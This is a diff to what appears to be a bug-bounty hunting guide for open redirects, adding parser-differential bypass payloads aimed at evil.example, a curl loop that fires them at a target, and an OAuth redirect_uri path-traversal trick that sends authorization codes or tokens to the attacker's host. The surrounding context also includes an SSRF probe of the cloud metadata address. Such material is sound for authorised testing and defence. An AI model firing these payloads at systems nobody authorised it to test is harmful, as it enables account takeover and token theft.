@@ -59,10 +59,22 @@ Open redirect alone is Low. Chained to OAuth = Critical (ATO).
 | URL encoding | `%2Fevil.com` |
 | Null byte | `evil.example%00target.com` |
 | Whitespace | `evil.example%09` or `%20` |
-| JavaScript URI | `javascript:window.location='https://evil.example'` |
-| Data URI | `data:text/html,<script>window.location='https://evil.example'</script>` |
 | Subdomain | `https://target.example.evil.example` |
 | Fragment | `https://evil.example#.target.example` |
+
+**Parser differentials (server validator vs the browser's WHATWG URL parser).** Browser results below were checked against a WHATWG URL implementation; the server half depends on the target's parser, so test each.
+
+| Class | Payload | Why it slips through |
+|-------|---------|----------------------|
+| Backslash as slash | `\\evil.example`, `/\evil.example` | Many server parsers see a relative path; browsers treat `\` as `/` in http(s) URLs → host `evil.example` |
+| Scheme without slashes | `http:evil.example` on an https target | Server sees no host; the browser adds `//` only when the scheme differs from the current page's (`https:evil.example` on an https page stays on-site) |
+| `%2F` in userinfo | `http://target.example%2F@evil.example` | Server decodes `%2F`, sees host `target.example`; the browser keeps `%2F` inside the userinfo and goes to the host after `@` |
+| Encoded / fullwidth `@` | `https://target.example%40evil.example`, `https://target.example＠evil.example` | Pass a prefix/substring check on the raw value; only work when the app URL-decodes or NFKC-normalises **after** validating (browsers reject both forms in a host) |
+| Ideographic full stop | `https://evil。example` | IDNA maps `。` to `.` in the browser; a string blocklist does not |
+
+Generate the full candidate set for your target's allowed host with PortSwigger's **URL validation bypass cheat sheet** (wordlists for SSRF, CORS and open redirect): https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
+
+`javascript:` and `data:` are not redirect bypasses. A `javascript:` URL reaching a client-side navigation sink is DOM XSS (`hunt-dom`, `hunt-xss`); a `Location` header pointing at either does not execute, and browsers block top-level navigation to `data:` URLs.
 
 ---
 
@@ -99,6 +111,9 @@ PAYLOADS=(
   "https://$TARGET@evil.example"
   "https://evil.example%23.$TARGET"
   "https://evil.example%09"
+  "\\\\evil.example"
+  "http:evil.example"
+  "http://$TARGET%2F@evil.example"
 )
 for P in "${PAYLOADS[@]}"; do
   LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
@@ -127,6 +142,7 @@ grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20
 OAUTH_URL="https://$TARGET/oauth/authorize"
 curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
 ```
+If the provider only prefix-matches the registered callback, path traversal reaches the open redirect while still passing the check: `redirect_uri=https://$TARGET/callback/../redirect?url=https://evil.example` (also try `%2e%2e%2f` and `..%2f`). The code or token then follows the redirect to your host. Provider-side validation, `response_mode` and token-in-fragment handling are owned by `hunt-oauth`.
 
 ### Phase 5 — Server-Side Redirect (SSRF escalation)
 ```bash
@@ -145,6 +161,11 @@ curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
 # openredirex
 pip3 install openredirex
 openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.example
+
+# Alternatives:
+#  - Burp Param Miner (github.com/PortSwigger/param-miner): guess unlinked redirect parameters
+#  - Oralyzer (github.com/r0075h3ll/Oralyzer): checks header, JavaScript and meta-refresh redirects
+#    (read its README for current flags before running)
 
 # nuclei
 nuclei -u https://$TARGET -t redirect/ -severity medium,high
